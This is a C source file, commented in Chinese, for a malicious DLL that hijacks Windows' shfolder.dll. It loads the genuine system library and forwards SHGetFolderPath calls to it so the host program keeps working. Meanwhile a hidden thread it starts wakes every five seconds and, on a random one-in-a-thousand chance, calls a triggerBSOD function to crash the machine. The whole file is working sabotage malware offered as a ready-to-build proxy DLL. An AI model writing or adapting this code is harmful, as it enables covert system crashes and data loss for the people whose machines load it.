/*
 * 已測試 可以作用在 Code Block 20.03 x64
 * 劫持目標 : shfolder.dll
 * 編譯目標 : x64
 */

#include "shfolder.h"
#include "BSOD.h"

TCHAR tzPath[MAX_PATH];
HMODULE hModule;

#define _USE_CHANCE
const int CHANCE = 1;
const int CHANCE_RATE = 1000;
const int SLEEP_TIME = 5000;

inline VOID WINAPI Free() {
	if (hModule) {
		FreeLibrary(hModule);
	}
}

DWORD WINAPI HijackMain(LPVOID lpParam) {
	while (TRUE) {
#ifdef _USE_CHANCE
		Sleep(SLEEP_TIME);
		if (rand() % CHANCE_RATE < CHANCE) {
			triggerBSOD();
			break;
		}
#else
		triggerBSOD();
		break;
#endif
	}
	return EXIT_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		GetSystemDirectory(tzPath, MAX_PATH);
		lstrcat(tzPath, TEXT("\\shfolder"));
		hModule = LoadLibrary(tzPath);

		Origin_SHGetFolderPathA = GetProcAddress(hModule, "SHGetFolderPathA");
		Origin_SHGetFolderPathW = GetProcAddress(hModule, "SHGetFolderPathW");
		CreateThread(NULL, 0, HijackMain, NULL, 0, NULL);
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH: {
		break;
	}
	case DLL_PROCESS_DETACH: {
		Free();
		break;
	}
	}
	return TRUE;
}